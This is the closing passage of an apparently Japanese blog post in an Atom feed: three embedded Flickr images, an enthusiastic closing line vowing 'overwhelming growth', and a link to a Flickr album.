<p><img src="https://c3.staticflickr.com/9/8804/28962963146_997cef1582_z.jpg" alt="animate1" /><br />
<img src="https://c4.staticflickr.com/9/8764/28378369683_968134345b_z.jpg" alt="animate2" /><br />
<img src="https://c1.staticflickr.com/9/8852/28890270032_4f1b0e093f_z.jpg" alt="animate2" /></p>
<h2 id="最後に">最後に</h2>
<p>絶対に<strong>💪圧倒的成長💪</strong>するぞ!!!!!!</p>
<p><a href="https://flic.kr/s/aHskF56QEW" class="uri">https://flic.kr/s/aHskF56QEW</a></p>]]></summary>
</entry>

</feed>
